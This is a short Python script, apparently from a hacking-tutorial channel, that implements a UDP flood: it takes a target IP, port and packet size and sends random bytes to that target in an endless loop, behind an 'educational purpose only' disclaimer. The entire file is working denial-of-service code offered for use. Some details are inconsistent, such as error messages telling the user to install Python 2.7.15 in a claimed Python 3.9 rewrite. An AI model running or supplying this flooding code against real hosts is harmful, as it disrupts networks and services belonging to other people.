import logging
import os
import random
import socket
from argparse import ArgumentParser
from sys import platform

"""
Rewrite to Python 3.9. You're welcome.
"""

########################################
########################################
# Educational purpose only             #
########################################
# I'm not responsible for your actions #
########################################
########################################

"""
Created By: TheTechHacker
==========================
SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ

"""

if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    logging.info("This Script Works Best on Kali linux")
elif platform == "win32":
    os.system("cls")
else:
    logging.info("\033[1;34m [-]Unknown System Detected \033[1;m")

logging.info("\033[1;32m")

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
logging.info("""
     _      _      _
    (.)< __(.)> __(.)=
  \___)  \___)  \___)   Ready To Send
  
  
=======================================
     Created By: TheTechHacker
=======================================
If You Use too much bytes 
You're Internet might get a bit slow
=======================================
"""
      )

try:
    args = ArgumentParser()
    args.add_argument('ip', help='ip')
    args.add_argument('port', help='port')
    args.add_argument('bytes')
    arguments = args.parse_args()
    ip = arguments.ip
    port = int(arguments.port)
    size = int(arguments.bytes)
    attack = os.urandom(size)
    logging.info(" ")
    logging.info("Lunching Attack")
    logging.info(" ")
except SyntaxError:
    logging.info(" ")
    exit("\033[1;34m ERROR \033[1;m")
except NameError:
    logging.info(" ")
    exit("\033[1;34m Invalid Input \033[1;m")
except KeyboardInterrupt:
    logging.info(" ")
    exit("\033[1;34m [-]Canceled By User \033[1;m")
except ImportError:
    logging.info(" ")
    exit("\033[1;34m [-]Install python 2.7.15")

while True:
    try:
        connect.sendto(attack, (ip, port))
        logging.info("Attacking sending bytes ===>")
    except KeyboardInterrupt:
        logging.info(" ")
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    except ImportError:
        logging.info(" ")
        exit("\033[1;34m [-]Install python 2.7.15")
